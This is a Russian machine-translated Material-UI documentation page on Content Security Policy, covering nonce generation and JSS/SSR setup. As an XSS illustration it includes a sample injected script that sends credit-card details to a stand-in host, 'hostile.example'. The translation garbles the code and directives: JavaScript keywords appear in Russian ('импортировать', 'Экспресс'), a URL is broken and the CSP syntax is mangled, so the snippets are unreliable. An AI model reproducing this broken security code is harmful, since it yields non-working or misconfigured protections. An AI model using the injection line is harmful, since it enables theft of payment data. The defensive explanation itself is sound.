# Политика безопасности контента (CSP)

<p class="description">Material-UI поддерживает заголовки политики безопасности контента.</p>

## Что такое CSP и почему оно полезно?

В принципе, CSP снижает атаки на межсайтовый скриптинг (XSS), требуя от разработчиков, чтобы белые списки источников, из которых извлекаются их активы. Этот список возвращается как заголовок с сервера. Например, скажем, что у вас есть сайт, размещенный на `https://example.com` заголовок CSP `умолчанию - src: 'self';` позволит все активы, расположенные по адресу `https://example.com/*` и запретить все остальные. Если на вашем веб-сайте есть раздел, который уязвим для XSS, где отображается неэкранированный пользовательский ввод, злоумышленник может ввести что-то вроде:

    <script>
      sendCreditCardДетали ('https: //hostile.example');
    </script>
    

Эта уязвимость позволит злоумышленнику выполнить что-либо. Однако с безопасным заголовком CSP браузер не загружает этот скрипт.

Вы можете узнать больше о CSP [здесь](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).

## Как реализовать CSP?

Чтобы использовать CSP с Material-UI (и JSS), вам нужно использовать nonce. Nonce - это случайно созданная строка, которая используется только один раз, поэтому вам нужно добавить промежуточное программное обеспечение сервера для генерации по одному для каждого запроса. У JSS есть [отличное учебное пособие](https://github.com/cssinjs/jss/blob/master/docs/csp.md) о том, как добиться этого с помощью «Экспресс» и «Реагировать шлем». Для основного сокращения продолжайте чтение.

CSP nonce - строка с кодировкой Base 64. Вы можете создать такой файл:

```js
импортировать uuidv4 из 'uuid / v4';

const nonce = new Buffer (uuidv4 ()). ToString ('base64');
```

Очень важно использовать версию UUID 4, поскольку она генерирует **непредсказуемую** строку. Затем вы применяете этот nonce к заголовку CSP. Заголовок CSP может выглядеть так: при использовании nonce:

```js
header ('Content-Security-Policy')
  .set (`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);
```

Если вы используете Server Side Rendering (SSR), вы должны передать nonce в теге `<style>` на сервере.

```jsx
<style
  id="jss-server-side"
  nonce={nonce}
  dangerouslySetInnerHTML={{ __html: sheetsRegistry.toString() } }
/>
```

Затем вы должны передать это nonce в JSS, чтобы он мог добавить его к последующим `<style>` тегам. Клиентская сторона получает nonce из заголовка. Вы должны включить этот заголовок независимо от того, используется ли SSR.

```jsx
<meta property="csp-nonce" content={nonce} />
```